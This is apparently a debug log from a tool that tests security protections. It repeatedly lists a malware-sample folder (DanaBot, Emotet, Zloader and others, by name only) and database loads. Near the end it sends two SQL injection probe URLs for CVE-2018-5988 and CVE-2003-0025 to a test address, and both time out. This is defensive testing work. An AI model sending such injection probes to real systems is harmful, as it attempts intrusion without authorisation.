2025-12-02 16:31:09 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:31:30 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'DanaBot.exe', 'path': 'Banking-Malware\\DanaBot.exe', 'is_file': True}, {'name': 'Dridex', 'path': 'Banking-Malware\\Dridex', 'is_file': False}, {'name': 'Emotet.zip', 'path': 'Banking-Malware\\Emotet.zip', 'is_file': True}, {'name': 'Zloader.xlsm', 'path': 'Banking-Malware\\Zloader.xlsm', 'is_file': True}]
2025-12-02 16:31:38 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:31:39 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-12-02 16:31:39 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-12-02 16:31:39 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-12-02 16:36:38 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:36:38 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:36:38 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:36:42 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:36:44 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-12-02 16:36:44 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-12-02 16:36:44 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-12-02 16:40:38 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:40:38 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:40:38 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:40:42 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:40:44 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-12-02 16:40:44 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-12-02 16:40:44 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-12-02 16:40:59 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:40:59 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:40:59 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:41:05 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-12-02 16:41:05 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-12-02 16:41:05 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-12-02 16:41:09 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:41:12 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:41:12 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:41:12 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:41:14 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-12-02 16:41:14 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-12-02 16:41:14 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-12-02 16:41:42 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-12-02 16:41:42 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-12-02 16:41:42 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-12-02 16:41:50 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:41:50 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:41:50 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:42:07 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:42:07 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:42:07 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:42:09 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:42:12 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-12-02 16:42:12 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-12-02 16:42:12 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-12-02 16:42:15 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:42:50 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:42:50 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:42:50 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:43:04 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-12-02 16:43:04 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-12-02 16:43:04 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-12-02 16:43:06 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:43:11 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:43:11 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:43:11 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:43:30 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:43:32 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:43:32 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:43:32 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:43:33 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:43:34 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-12-02 16:43:34 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-12-02 16:43:34 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-12-02 16:44:58 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:44:58 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:44:58 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:45:00 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:45:03 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-12-02 16:45:03 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-12-02 16:45:03 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-12-02 16:45:13 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:45:13 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:45:13 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:45:18 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:46:28 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:46:30 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:46:32 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:46:41 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:47:04 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:47:10 - DEBUG - dir_listing:270 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 16:47:13 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:47:13 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:47:13 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:47:16 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:47:16 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:47:16 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:47:34 - INFO - get_protection_by_name:371 - Fetching protection by name: Flexible Poll SQL Injection (CVE-2018-5988)
2025-12-02 16:47:34 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Flexible Poll SQL Injection (CVE-2018-5988)', 'CVE-2018-5988', 'GET', "http://{{IP}}/cgi-bin/index.php?id='", 'http', 'Medium', 'Critical', 'Medium', '')
2025-12-02 16:47:34 - INFO - get_protection_by_name:399 - Protection 'Flexible Poll SQL Injection (CVE-2018-5988)' retrieved successfully.
2025-12-02 16:47:34 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.250/cgi-bin/index.php?id=' with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 16:47:40 - INFO - get_protection_by_name:371 - Fetching protection by name: IMP SQL Injection (CVE-2003-0025)
2025-12-02 16:47:40 - DEBUG - get_protection_by_name:384 - Protection fetched: ('IMP SQL Injection (CVE-2003-0025)', 'CVE-2003-0025', 'GET', "http://{{IP}}/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x", 'http', 'Medium', 'High', 'Medium', '')
2025-12-02 16:47:40 - INFO - get_protection_by_name:399 - Protection 'IMP SQL Injection (CVE-2003-0025)' retrieved successfully.
2025-12-02 16:47:40 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.250/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 16:47:55 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.250/cgi-bin/index.php?id=': HTTPConnectionPool(host='203.0.113.250', port=80): Max retries exceeded with url: /cgi-bin/index.php?id=' (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000002188C43FE00>, 'Connection to 203.0.113.250 timed out. (connect timeout=None)'))
2025-12-02 16:47:55 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:47:55 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:47:55 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:48:01 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.250/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x: HTTPConnectionPool(host='203.0.113.250', port=80): Max retries exceeded with url: /cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000002188C456850>, 'Connection to 203.0.113.250 timed out. (connect timeout=None)'))
2025-12-02 16:48:01 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:48:01 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:48:01 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:48:06 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-12-02 16:48:06 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-12-02 16:48:06 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-12-02 16:48:16 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:48:16 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:48:16 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:50:08 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:50:08 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-12-02 16:50:08 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:53:26 - INFO - init_db:58 - Initializing protections database.
2025-12-02 16:53:26 - INFO - init_db:58 - Initializing protections database.
2025-12-02 16:53:26 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-12-02 16:53:26 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-12-02 16:53:26 - INFO - init_db:58 - Initializing protections database.
2025-12-02 16:53:26 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-12-02 16:53:26 - DEBUG - init_db:68 - Creating 'protections' table.
2025-12-02 16:53:26 - INFO - init_db:86 - 'protections' table created successfully.
2025-12-02 16:53:26 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-12-02 16:53:26 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-12-02 16:53:26 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-12-02 16:53:26 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-12-02 16:53:26 - DEBUG - init_db:68 - Creating 'protections' table.
2025-12-02 16:53:26 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-12-02 16:53:26 - INFO - init_db:86 - 'protections' table created successfully.
2025-12-02 16:53:26 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-12-02 16:53:26 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-12-02 16:53:26 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-12-02 16:53:26 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-12-02 16:53:26 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-12-02 16:53:26 - DEBUG - init_db:68 - Creating 'protections' table.
2025-12-02 16:53:26 - INFO - init_db:86 - 'protections' table created successfully.
2025-12-02 16:53:26 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-12-02 16:53:26 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-12-02 16:53:26 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-12-02 16:53:26 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-12-02 16:53:26 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-12-02 16:53:26 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-12-02 16:53:26 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-12-02 16:53:26 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-12-02 16:53:26 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-12-02 16:53:26 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-12-02 16:53:26 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-12-02 16:53:26 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
